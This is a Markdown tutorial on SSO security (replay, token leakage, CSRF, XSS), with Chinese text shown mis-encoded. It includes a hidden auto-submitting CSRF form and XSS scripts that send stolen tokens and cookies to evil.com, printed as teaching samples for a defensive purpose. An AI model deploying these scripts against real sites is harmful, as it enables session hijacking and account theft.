---
title: 8ã€SSOå®‰å…¨é˜²æŠ¤è¦ç‚¹
---
## ğŸ“š ç›®å½•

1. [é˜²é‡æ”¾æ”»å‡»](#1-é˜²é‡æ”¾æ”»å‡»)
2. [é˜²æ­¢Tokenæ³„éœ²](#2-é˜²æ­¢Tokenæ³„éœ²)
3. [CSRFåœ¨SSOåœºæ™¯ä¸‹çš„é˜²å¾¡](#3-CSRFåœ¨SSOåœºæ™¯ä¸‹çš„é˜²å¾¡)
4. [XSSå¯¹Token/Cookieçš„å¨èƒ](#4-XSSå¯¹Token/Cookieçš„å¨èƒ)
5. [è¿‡æœŸä¸æ’¤é”€æœºåˆ¶](#5-è¿‡æœŸä¸æ’¤é”€æœºåˆ¶)
6. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#6-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸ”„ é˜²é‡æ”¾æ”»å‡»


### 1.1 ä»€ä¹ˆæ˜¯é‡æ”¾æ”»å‡»


**é€šä¿—è§£é‡Š**ï¼šé‡æ”¾æ”»å‡»å°±åƒæ˜¯"å½•éŸ³é‡æ’­"ï¼Œæ”»å‡»è€…å·å¬åˆ°ä½ å’Œé“¶è¡Œçš„å¯¹è¯ï¼Œç„¶åæŠŠè¿™æ®µå¯¹è¯é‡æ–°æ’­æ”¾ç»™é“¶è¡Œï¼Œå‡è£…æ˜¯ä½ åœ¨è¯´è¯ã€‚

```
æ­£å¸¸ç™»å½•è¿‡ç¨‹ï¼š
ç”¨æˆ· â†’ "æˆ‘æ˜¯å¼ ä¸‰ï¼Œå¯†ç 123456" â†’ è®¤è¯ä¸­å¿ƒ â†’ "ç™»å½•æˆåŠŸï¼Œç»™ä½ Token"

é‡æ”¾æ”»å‡»è¿‡ç¨‹ï¼š
æ”»å‡»è€… â†’ "æˆ‘æ˜¯å¼ ä¸‰ï¼Œå¯†ç 123456"(å·å¬åˆ°çš„) â†’ è®¤è¯ä¸­å¿ƒ â†’ "åˆä¸€æ¬¡ç™»å½•æˆåŠŸ"
```

**SSOä¸­çš„é‡æ”¾æ”»å‡»åœºæ™¯**ï¼š
- æ”»å‡»è€…æˆªè·äº†ç”¨æˆ·çš„ç™»å½•è¯·æ±‚
- é‡å¤å‘é€è¿™ä¸ªè¯·æ±‚æ¥å†’å……ç”¨æˆ·ç™»å½•
- å¯èƒ½è·å¾—æ–°çš„æœ‰æ•ˆToken

### 1.2 é‡æ”¾æ”»å‡»çš„å±å®³


```
å±å®³ç¤ºä¾‹ï¼š
1. ç”¨æˆ·åœ¨å’–å•¡å…ç”¨å…¬å…±WiFiç™»å½•
2. æ”»å‡»è€…ç›‘å¬ç½‘ç»œï¼Œæˆªè·ç™»å½•æ•°æ®åŒ…
3. æ”»å‡»è€…ç¨åé‡æ”¾è¿™ä¸ªæ•°æ®åŒ…
4. ç³»ç»Ÿè®¤ä¸ºæ˜¯ç”¨æˆ·å†æ¬¡ç™»å½•ï¼Œåˆ†å‘æ–°Token
5. æ”»å‡»è€…ç”¨æ–°Tokenè®¿é—®ç”¨æˆ·æ•°æ®
```

### 1.3 é˜²é‡æ”¾æ”»å‡»çš„æ ¸å¿ƒæ–¹æ³•


#### ğŸ”¸ æ—¶é—´æˆ³éªŒè¯

**åŸç†**ï¼šç»™æ¯ä¸ªè¯·æ±‚åŠ ä¸Šæ—¶é—´æˆ³ï¼Œè¿‡æœŸçš„è¯·æ±‚ç›´æ¥æ‹’ç»

```javascript
// å®¢æˆ·ç«¯å‘é€è¯·æ±‚
const loginRequest = {
  username: "zhangsan",
  password: "hash_value",
  timestamp: Date.now(),  // å½“å‰æ—¶é—´æˆ³
  signature: "ç­¾åå€¼"
};

// æœåŠ¡ç«¯éªŒè¯
function validateRequest(request) {
  const currentTime = Date.now();
  const requestTime = request.timestamp;
  
  // è¯·æ±‚è¶…è¿‡5åˆ†é’Ÿå°±æ‹’ç»
  if (currentTime - requestTime > 5 * 60 * 1000) {
    return false;  // è¯·æ±‚è¿‡æœŸ
  }
  return true;
}
```

#### ğŸ”¸ éšæœºæ•°(Nonce)éªŒè¯

**åŸç†**ï¼šæ¯ä¸ªè¯·æ±‚éƒ½å¸¦ä¸€ä¸ªå”¯ä¸€çš„éšæœºæ•°ï¼Œç”¨è¿‡å°±ä½œåºŸ

```javascript
// ç”Ÿæˆéšæœºæ•°
function generateNonce() {
  return Math.random().toString(36) + Date.now().toString(36);
}

// å®¢æˆ·ç«¯è¯·æ±‚
const request = {
  username: "zhangsan",
  nonce: "abc123def456",  // å”¯ä¸€éšæœºæ•°
  timestamp: Date.now()
};

// æœåŠ¡ç«¯éªŒè¯ï¼ˆä¼ªä»£ç ï¼‰
const usedNonces = new Set();  // å­˜å‚¨å·²ä½¿ç”¨çš„éšæœºæ•°

function validateNonce(nonce) {
  if (usedNonces.has(nonce)) {
    return false;  // éšæœºæ•°å·²è¢«ä½¿ç”¨
  }
  usedNonces.add(nonce);
  return true;
}
```

#### ğŸ”¸ ç­¾åéªŒè¯

**åŸç†**ï¼šå¯¹è¯·æ±‚å†…å®¹è¿›è¡Œæ•°å­—ç­¾åï¼Œç¡®ä¿å†…å®¹æ²¡æœ‰è¢«ç¯¡æ”¹

```javascript
// ç”Ÿæˆç­¾å
function generateSignature(data, secretKey) {
  const message = data.username + data.timestamp + data.nonce;
  return hmacSHA256(message, secretKey);
}

// å®Œæ•´çš„é˜²é‡æ”¾è¯·æ±‚
const secureRequest = {
  username: "zhangsan",
  timestamp: Date.now(),
  nonce: generateNonce(),
  signature: generateSignature(data, "secret_key")
};
```

### 1.4 é˜²é‡æ”¾æ”»å‡»æœ€ä½³å®è·µ


```
ç»¼åˆé˜²æŠ¤ç­–ç•¥ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å®¢æˆ·ç«¯è¯·æ±‚      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚æ—¶é—´æˆ³+éšæœºæ•° â”‚â”‚ â† åŸºç¡€é˜²æŠ¤
â”‚  â”‚æ•°å­—ç­¾å     â”‚â”‚ â† å®Œæ•´æ€§ä¿æŠ¤
â”‚  â”‚HTTPSä¼ è¾“   â”‚â”‚ â† ä¼ è¾“å®‰å…¨
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  æœåŠ¡ç«¯éªŒè¯      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚æ—¶é—´æˆ³æ£€æŸ¥   â”‚â”‚ â† è¿‡æœŸæ£€æµ‹
â”‚  â”‚éšæœºæ•°æ£€æŸ¥   â”‚â”‚ â† é‡å¤æ£€æµ‹
â”‚  â”‚ç­¾åéªŒè¯     â”‚â”‚ â† ç¯¡æ”¹æ£€æµ‹
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 2. ğŸ”’ é˜²æ­¢Tokenæ³„éœ²


### 2.1 Tokenæ³„éœ²çš„é£é™©


**ç®€å•ç†è§£**ï¼šTokenå°±åƒæ˜¯ä½ çš„"é€šè¡Œè¯"ï¼Œå¦‚æœè¢«åˆ«äººæ‹¿åˆ°ï¼Œä»–ä»¬å°±èƒ½å†’å……ä½ è¿›å…¥å„ç§ç³»ç»Ÿã€‚

**å¸¸è§æ³„éœ²é€”å¾„**ï¼š
```
ğŸ”¸ ç½‘ç»œä¼ è¾“è¢«æˆªè·
  HTTPæ˜æ–‡ä¼ è¾“ â†’ å®¹æ˜“è¢«ç›‘å¬

ğŸ”¸ å®¢æˆ·ç«¯å­˜å‚¨ä¸å®‰å…¨
  æµè§ˆå™¨æ§åˆ¶å°å¯è§ â†’ å¼€å‘è€…å·¥å…·æš´éœ²
  localStorageæ˜æ–‡å­˜å‚¨ â†’ XSSæ”»å‡»è·å–

ğŸ”¸ æ—¥å¿—æ–‡ä»¶è®°å½•
  æœåŠ¡å™¨æ—¥å¿—åŒ…å«Token â†’ æ—¥å¿—æ³„éœ²é£é™©

ğŸ”¸ URLå‚æ•°ä¼ é€’
  Tokenä½œä¸ºGETå‚æ•° â†’ æµè§ˆå™¨å†å²ã€ä»£ç†æœåŠ¡å™¨ç¼“å­˜
```

### 2.2 HTTPSå¼ºåˆ¶ä¼ è¾“


**ä¸ºä»€ä¹ˆå¿…é¡»ç”¨HTTPS**ï¼š
```
HTTPä¼ è¾“ï¼ˆå±é™©ï¼‰ï¼š
å®¢æˆ·ç«¯ â”€æ˜æ–‡Tokenâ”€> ç½‘ç»œ â”€æ˜æ–‡Tokenâ”€> æœåŠ¡ç«¯
        â†‘
     æ”»å‡»è€…è½»æ˜“æˆªè·

HTTPSä¼ è¾“ï¼ˆå®‰å…¨ï¼‰ï¼š
å®¢æˆ·ç«¯ â”€åŠ å¯†Tokenâ”€> ç½‘ç»œ â”€åŠ å¯†Tokenâ”€> æœåŠ¡ç«¯
        â†‘
     æ”»å‡»è€…åªèƒ½çœ‹åˆ°ä¹±ç 
```

**HTTPSé…ç½®è¦ç‚¹**ï¼š
```javascript
// æœåŠ¡ç«¯å¼ºåˆ¶HTTPS
app.use((req, res, next) => {
  if (!req.secure && req.get('x-forwarded-proto') !== 'https') {
    return res.redirect('https://' + req.get('host') + req.url);
  }
  next();
});

// Cookieè®¾ç½®å®‰å…¨æ ‡å¿—
res.cookie('token', tokenValue, {
  secure: true,     // åªèƒ½é€šè¿‡HTTPSä¼ è¾“
  httpOnly: true,   // ç¦æ­¢JavaScriptè®¿é—®
  sameSite: 'strict' // é˜²æ­¢CSRF
});
```

### 2.3 Tokenç­¾åæ ¡éªŒ


**ç­¾åçš„ä½œç”¨**ï¼šå°±åƒç»™Tokenç›–äº†ä¸ª"é˜²ä¼ªå°ç« "ï¼Œç¡®ä¿Tokenæ²¡æœ‰è¢«ç¯¡æ”¹ã€‚

```javascript
// JWT Tokenç»“æ„ç¤ºä¾‹
const jwtToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiemhhbmdzYW4iLCJleHAiOjE2MzQ1Njc4OTB9.signature_part";

// è§£æï¼š
// Header:  {"alg":"HS256","typ":"JWT"}
// Payload: {"user":"zhangsan","exp":1634567890}
// Signature: ç”¨å¯†é’¥å¯¹å‰ä¸¤éƒ¨åˆ†çš„ç­¾å

// æœåŠ¡ç«¯éªŒè¯ç­¾å
function verifyToken(token, secretKey) {
  try {
    const decoded = jwt.verify(token, secretKey);
    return { valid: true, payload: decoded };
  } catch (error) {
    return { valid: false, error: "Tokenè¢«ç¯¡æ”¹æˆ–å·²è¿‡æœŸ" };
  }
}
```

### 2.4 Tokenå®‰å…¨å­˜å‚¨


**å®¢æˆ·ç«¯å­˜å‚¨å¯¹æ¯”**ï¼š

| å­˜å‚¨æ–¹å¼ | å®‰å…¨æ€§ | XSSé£é™© | CSRFé£é™© | è¯´æ˜ |
|---------|--------|---------|----------|------|
| **localStorage** | âŒ ä½ | âš ï¸ é«˜ | âœ… ä½ | æ°¸ä¹…å­˜å‚¨ï¼ŒJSå¯è®¿é—® |
| **sessionStorage** | âŒ ä½ | âš ï¸ é«˜ | âœ… ä½ | ä¼šè¯å­˜å‚¨ï¼ŒJSå¯è®¿é—® |
| **httpOnly Cookie** | âœ… é«˜ | âœ… ä½ | âš ï¸ é«˜ | JSæ— æ³•è®¿é—®ï¼Œéœ€CSRFé˜²æŠ¤ |
| **å†…å­˜å­˜å‚¨** | âœ… é«˜ | âœ… ä½ | âœ… ä½ | åˆ·æ–°é¡µé¢ä¸¢å¤± |

**æ¨èçš„å­˜å‚¨ç­–ç•¥**ï¼š
```javascript
// æ–¹æ¡ˆ1ï¼šhttpOnly Cookie + CSRF Token
res.cookie('access_token', token, {
  httpOnly: true,    // JavaScriptæ— æ³•è®¿é—®
  secure: true,      // åªèƒ½HTTPSä¼ è¾“
  sameSite: 'strict', // ä¸¥æ ¼åŒç«™ç­–ç•¥
  maxAge: 15 * 60 * 1000  // 15åˆ†é’Ÿè¿‡æœŸ
});

// æ–¹æ¡ˆ2ï¼šå†…å­˜å­˜å‚¨ + è‡ªåŠ¨åˆ·æ–°
class TokenManager {
  constructor() {
    this.token = null;  // å­˜å‚¨åœ¨å†…å­˜ä¸­
    this.refreshTimer = null;
  }
  
  setToken(token) {
    this.token = token;
    this.setupAutoRefresh();
  }
  
  getToken() {
    return this.token;
  }
  
  clearToken() {
    this.token = null;
    if (this.refreshTimer) {
      clearInterval(this.refreshTimer);
    }
  }
}
```

---

## 3. ğŸ›¡ï¸ CSRFåœ¨SSOåœºæ™¯ä¸‹çš„é˜²å¾¡


### 3.1 ä»€ä¹ˆæ˜¯CSRFæ”»å‡»


**é€šä¿—è§£é‡Š**ï¼šCSRFå°±åƒæ˜¯"å€Ÿåˆ€æ€äºº"ã€‚æ”»å‡»è€…ä¸ç›´æ¥å·ä½ çš„å¯†ç ï¼Œè€Œæ˜¯è¯±å¯¼ä½ åœ¨å·²ç™»å½•çŠ¶æ€ä¸‹ç‚¹å‡»æ¶æ„é“¾æ¥ï¼Œåˆ©ç”¨ä½ çš„èº«ä»½æ‰§è¡Œæ¶æ„æ“ä½œã€‚

```
CSRFæ”»å‡»è¿‡ç¨‹ï¼š
1. ç”¨æˆ·æ­£å¸¸ç™»å½•é“¶è¡Œç½‘ç«™ â†’ è·å¾—Session Cookie
2. ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™
3. æ¶æ„ç½‘ç«™åŒ…å«éšè—è¡¨å•ï¼š
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="æ”»å‡»è€…è´¦å·">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>
4. æµè§ˆå™¨è‡ªåŠ¨å¸¦ä¸ŠCookieå‘é“¶è¡Œå‘è¯·æ±‚
5. é“¶è¡Œä»¥ä¸ºæ˜¯ç”¨æˆ·æ­£å¸¸æ“ä½œ â†’ è½¬è´¦æˆåŠŸ
```

### 3.2 SSOä¸­çš„CSRFé£é™©


**SSOæ”¾å¤§äº†CSRFé£é™©**ï¼š
```
ä¼ ç»ŸWebåº”ç”¨ï¼š
æ”»å‡»ä¸€ä¸ªç½‘ç«™ â†’ å½±å“ä¸€ä¸ªè´¦å·

SSOç¯å¢ƒï¼š
æ”»å‡»SSOç™»å½•çŠ¶æ€ â†’ å½±å“æ‰€æœ‰å…³è”åº”ç”¨

é£é™©ç¤ºä¾‹ï¼š
ç”¨æˆ·åœ¨å…¬å¸SSOå·²ç™»å½• â†’ èƒ½è®¿é—®ï¼šé‚®ç®±ã€æ–‡æ¡£ã€è´¢åŠ¡ç³»ç»Ÿ
æ”»å‡»è€…CSRFæ”»å‡»æˆåŠŸ â†’ èƒ½æ“ä½œï¼šå‘é‚®ä»¶ã€åˆ æ–‡æ¡£ã€æŸ¥è´¦ç›®
```

### 3.3 CSRFé˜²å¾¡ç­–ç•¥


#### ğŸ”¸ CSRF TokenéªŒè¯

**åŸç†**ï¼šåœ¨è¡¨å•ä¸­åŠ å…¥éšæœºTokenï¼Œæ”»å‡»è€…æ— æ³•ä¼ªé€ 

```html
<!-- ç™»å½•é¡µé¢åŒ…å«CSRF Token -->
<form action="/login" method="POST">
  <input type="hidden" name="csrf_token" value="random_token_value">
  <input type="text" name="username">
  <input type="password" name="password">
  <button type="submit">ç™»å½•</button>
</form>
```

```javascript
// æœåŠ¡ç«¯ç”Ÿæˆå’ŒéªŒè¯CSRF Token
const crypto = require('crypto');

// ç”ŸæˆCSRF Token
function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

// éªŒè¯CSRF Token
function validateCSRFToken(sessionToken, requestToken) {
  return sessionToken === requestToken;
}

// ç™»å½•å¤„ç†
app.post('/login', (req, res) => {
  const { csrf_token, username, password } = req.body;
  
  // éªŒè¯CSRF Token
  if (!validateCSRFToken(req.session.csrf_token, csrf_token)) {
    return res.status(403).send('CSRF TokenéªŒè¯å¤±è´¥');
  }
  
  // ç»§ç»­ç™»å½•æµç¨‹...
});
```

#### ğŸ”¸ SameSite Cookieå±æ€§

**åŸç†**ï¼šé™åˆ¶Cookieåªèƒ½åœ¨åŒç«™è¯·æ±‚ä¸­å‘é€

```javascript
// è®¾ç½®SameSiteå±æ€§
res.cookie('session_id', sessionId, {
  sameSite: 'strict',  // ä¸¥æ ¼æ¨¡å¼ï¼šåªæœ‰åŒç«™è¯·æ±‚æ‰å‘é€
  secure: true,        // åªèƒ½HTTPSä¼ è¾“
  httpOnly: true       // JavaScriptæ— æ³•è®¿é—®
});

// SameSiteé€‰é¡¹è¯´æ˜ï¼š
// strict: æœ€ä¸¥æ ¼ï¼Œè·¨ç«™è¯·æ±‚ç»ä¸å‘é€Cookie
// lax: å®½æ¾æ¨¡å¼ï¼ŒGETè¯·æ±‚å¯ä»¥å‘é€Cookie
// none: æ— é™åˆ¶ï¼Œéœ€è¦secure=true
```

#### ğŸ”¸ Refereræ£€æŸ¥

**åŸç†**ï¼šæ£€æŸ¥è¯·æ±‚æ¥æºï¼Œæ‹’ç»æ¥è‡ªå…¶ä»–ç½‘ç«™çš„è¯·æ±‚

```javascript
// æ£€æŸ¥è¯·æ±‚æ¥æº
function validateReferer(req) {
  const referer = req.get('Referer');
  const allowedOrigins = ['https://myapp.com', 'https://sso.myapp.com'];
  
  if (!referer) {
    return false;  // æ— Refererå¤´
  }
  
  const refererOrigin = new URL(referer).origin;
  return allowedOrigins.includes(refererOrigin);
}

app.post('/login', (req, res) => {
  if (!validateReferer(req)) {
    return res.status(403).send('éæ³•è¯·æ±‚æ¥æº');
  }
  // ç»§ç»­å¤„ç†...
});
```

### 3.4 SSOä¸­çš„CSRFé˜²æŠ¤æœ€ä½³å®è·µ


```
é˜²æŠ¤å±‚æ¬¡å›¾ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   æµè§ˆå™¨å±‚       â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚SameSiteå±æ€§ â”‚ â”‚ â† ç¬¬ä¸€é“é˜²çº¿
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   åº”ç”¨å±‚        â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚CSRF Token   â”‚ â”‚ â† ç¬¬äºŒé“é˜²çº¿
â”‚ â”‚Refereræ£€æŸ¥  â”‚ â”‚ â† ç¬¬ä¸‰é“é˜²çº¿
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ä¸šåŠ¡å±‚        â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚å…³é”®æ“ä½œç¡®è®¤  â”‚ â”‚ â† æœ€åé˜²çº¿
â”‚ â”‚äºŒæ¬¡éªŒè¯     â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 4. ğŸ•·ï¸ XSSå¯¹Token/Cookieçš„å¨èƒ


### 4.1 ä»€ä¹ˆæ˜¯XSSæ”»å‡»


**é€šä¿—è§£é‡Š**ï¼šXSSå°±åƒæ˜¯åœ¨ä½ çš„ç½‘é¡µé‡Œ"ä¸‹æ¯’"ã€‚æ”»å‡»è€…æƒ³åŠæ³•æŠŠæ¶æ„ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ï¼Œå½“ä½ è®¿é—®è¿™ä¸ªç½‘é¡µæ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šæ‰§è¡Œï¼Œå·å–ä½ çš„æ•æ„Ÿä¿¡æ¯ã€‚

**XSSæ”»å‡»ç±»å‹**ï¼š
```
ğŸ”¸ åå°„å‹XSSï¼š
URL: https://site.com/search?q=<script>alert('XSS')</script>
ç½‘é¡µç›´æ¥æ˜¾ç¤ºæœç´¢å†…å®¹ â†’ æ‰§è¡Œæ¶æ„è„šæœ¬

ğŸ”¸ å­˜å‚¨å‹XSSï¼š
æ”»å‡»è€…åœ¨è¯„è®ºä¸­è¾“å…¥æ¶æ„è„šæœ¬ â†’ å­˜å‚¨åˆ°æ•°æ®åº“
å…¶ä»–ç”¨æˆ·æŸ¥çœ‹è¯„è®º â†’ æ‰§è¡Œæ¶æ„è„šæœ¬

ğŸ”¸ DOMå‹XSSï¼š
é¡µé¢JavaScriptç›´æ¥å¤„ç†URLå‚æ•° â†’ åŠ¨æ€ç”Ÿæˆæ¶æ„å†…å®¹
```

### 4.2 XSSæ”»å‡»Tokenå’ŒCookie


**Tokençªƒå–ç¤ºä¾‹**ï¼š
```javascript
// æ”»å‡»è€…æ³¨å…¥çš„æ¶æ„è„šæœ¬
<script>
// çªƒå–localStorageä¸­çš„Token
const token = localStorage.getItem('access_token');

// çªƒå–sessionStorageä¸­çš„Token
const sessionToken = sessionStorage.getItem('token');

// å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    token: token,
    sessionToken: sessionToken,
    cookies: document.cookie  // å¦‚æœCookieæ²¡æœ‰httpOnly
  })
});
</script>
```

**Cookieçªƒå–ç¤ºä¾‹**ï¼š
```javascript
// å¦‚æœCookieæ²¡æœ‰è®¾ç½®httpOnly
<script>
// çªƒå–æ‰€æœ‰Cookie
const cookies = document.cookie;

// æ„é€ å›¾ç‰‡è¯·æ±‚å‘é€æ•°æ®ï¼ˆç»•è¿‡CORSï¼‰
const img = new Image();
img.src = 'https://evil.com/steal?data=' + encodeURIComponent(cookies);
</script>
```

### 4.3 XSSé˜²æŠ¤ç­–ç•¥


#### ğŸ”¸ è¾“å…¥éªŒè¯å’Œè½¬ä¹‰

**åŸç†**ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼éªŒè¯å’Œè½¬ä¹‰ï¼Œé˜²æ­¢æ¶æ„è„šæœ¬æ‰§è¡Œ

```javascript
// è¾“å…¥éªŒè¯
function validateInput(input) {
  // ç™½åå•ï¼šåªå…è®¸å­—æ¯ã€æ•°å­—ã€åŸºæœ¬ç¬¦å·
  const allowedPattern = /^[a-zA-Z0-9\s\-_.@]+$/;
  return allowedPattern.test(input);
}

// HTMLè½¬ä¹‰
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// ä½¿ç”¨ç¤ºä¾‹
const userInput = "<script>alert('xss')</script>";
const safeOutput = escapeHtml(userInput);
// ç»“æœ: "&lt;script&gt;alert('xss')&lt;/script&gt;"
```

#### ğŸ”¸ Content Security Policy (CSP)

**åŸç†**ï¼šé€šè¿‡HTTPå¤´é™åˆ¶é¡µé¢èƒ½æ‰§è¡Œçš„è„šæœ¬æ¥æº

```javascript
// è®¾ç½®CSPå¤´
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; " +           // é»˜è®¤åªå…è®¸åŒæº
    "script-src 'self' 'unsafe-inline'; " +  // è„šæœ¬æ¥æºé™åˆ¶
    "style-src 'self' 'unsafe-inline'; " +   // æ ·å¼æ¥æºé™åˆ¶
    "img-src 'self' data: https:; " +        // å›¾ç‰‡æ¥æºé™åˆ¶
    "connect-src 'self';"                     // AJAXè¯·æ±‚é™åˆ¶
  );
  next();
});
```

#### ğŸ”¸ HttpOnly Cookie

**åŸç†**ï¼šè®¾ç½®httpOnlyå±æ€§ï¼ŒJavaScriptæ— æ³•è®¿é—®Cookie

```javascript
// å®‰å…¨çš„Cookieè®¾ç½®
res.cookie('session_token', token, {
  httpOnly: true,     // JavaScriptæ— æ³•è®¿é—®
  secure: true,       // åªèƒ½HTTPSä¼ è¾“
  sameSite: 'strict', // é˜²æ­¢CSRF
  maxAge: 30 * 60 * 1000  // 30åˆ†é’Ÿè¿‡æœŸ
});

// é”™è¯¯çš„åšæ³•ï¼ˆå±é™©ï¼‰
// document.cookie = "token=" + tokenValue;  // XSSå¯ä»¥è½»æ˜“è·å–
```

#### ğŸ”¸ Tokenå­˜å‚¨æœ€ä½³å®è·µ

**å®‰å…¨å­˜å‚¨å¯¹æ¯”**ï¼š

```javascript
// âŒ å±é™©åšæ³•ï¼š
localStorage.setItem('token', tokenValue);  // XSSå¯ä»¥è·å–
sessionStorage.setItem('token', tokenValue); // XSSå¯ä»¥è·å–

// âœ… æ¨èåšæ³•1ï¼šå†…å­˜å­˜å‚¨
class SecureTokenManager {
  constructor() {
    this.token = null;  // å­˜å‚¨åœ¨é—­åŒ…ä¸­ï¼ŒXSSæ— æ³•ç›´æ¥è®¿é—®
  }
  
  setToken(token) {
    this.token = token;
  }
  
  getToken() {
    return this.token;
  }
  
  // é¡µé¢åˆ·æ–°æ—¶tokenä¸¢å¤±ï¼Œéœ€è¦é‡æ–°è·å–
}

// âœ… æ¨èåšæ³•2ï¼šHttpOnly Cookie
// ç”±æœåŠ¡ç«¯è®¾ç½®ï¼Œå®¢æˆ·ç«¯æ— éœ€å¤„ç†
```

### 4.4 XSSé˜²æŠ¤å…¨é¢ç­–ç•¥


```
XSSé˜²æŠ¤ä½“ç³»ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      è¾“å…¥å±‚          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚è¾“å…¥éªŒè¯+è¿‡æ»¤    â”‚â”‚ â† ç¬¬ä¸€é“é˜²çº¿
â”‚  â”‚ç™½åå•ç­–ç•¥       â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
          â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      å­˜å‚¨å±‚          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚ç¼–ç å­˜å‚¨         â”‚â”‚ â† ç¬¬äºŒé“é˜²çº¿
â”‚  â”‚å‚æ•°åŒ–æŸ¥è¯¢       â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
          â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      è¾“å‡ºå±‚          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚HTMLè½¬ä¹‰         â”‚â”‚ â† ç¬¬ä¸‰é“é˜²çº¿
â”‚  â”‚æ¨¡æ¿å¼•æ“è‡ªåŠ¨è½¬ä¹‰  â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
          â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      æµè§ˆå™¨å±‚        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚CSPç­–ç•¥          â”‚â”‚ â† ç¬¬å››é“é˜²çº¿
â”‚  â”‚HttpOnly Cookie  â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
